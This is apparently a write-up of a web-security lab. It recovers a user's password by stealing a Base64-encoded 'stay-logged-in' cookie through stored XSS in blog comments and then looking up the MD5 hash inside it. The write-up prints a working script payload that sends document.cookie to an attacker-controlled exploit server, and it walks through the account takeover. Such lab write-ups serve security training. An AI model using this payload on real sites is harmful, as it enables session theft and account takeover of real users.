# Offline Password Cracking

## Challenge Information

* **Category**: Authentication / XSS
* **Level**: Practitioner (Level-2)

## Initial Analysis

I started by logging into my own account with Burp running and checked how the **Stay logged in** feature behaved. I noticed the `stay-logged-in` cookie was Base64-encoded, so I decoded it and found it followed the format:

```
username + ':' + md5HashOfPassword
```

That told me the cookie contained the username and an MD5 of the password — which is something I could abuse if I could obtain another user’s cookie.

## Request Analysis

I reviewed the application to find a vector to steal a cookie. I inspected the blog/comment functionality and noticed it was vulnerable to **stored XSS**. That gave me a way to exfiltrate cookies to an external server I control (the exploit server provided by the lab).

## Attack Execution

1. I went to the exploit server and noted the URL I would receive exfiltrated requests at.
2. I posted a comment on one of the blogs containing a small stored XSS payload that sends `document.cookie` to the exploit server. The payload I used was:

```html
<script>document.location='//My-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

(Replace `My-EXPLOIT-SERVER-ID` with your exploit server’s ID.)

3. I opened the exploit server’s access log and waited for a request from a victim. After a short while a GET request appeared in the log containing the victim’s `stay-logged-in` cookie.
4. I copied the Base64 cookie value from the log and decoded it in Burp Decoder. The decoded value was:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

5. I copied the hash portion (`26323c16d5f4dabff3bb136f2460a943`) and searched for it — this revealed the plaintext password `onceuponatime`.
6. I logged in as Carlos using the recovered password, navigated to the **My account** page, and deleted the account to complete the lab.

## Vulnerability

**Result**: The application encodes the cookie using a predictable formula, and the comment feature was vulnerable to stored XSS, the attacker can easily get the cookie of the user and use the formula to get the password.
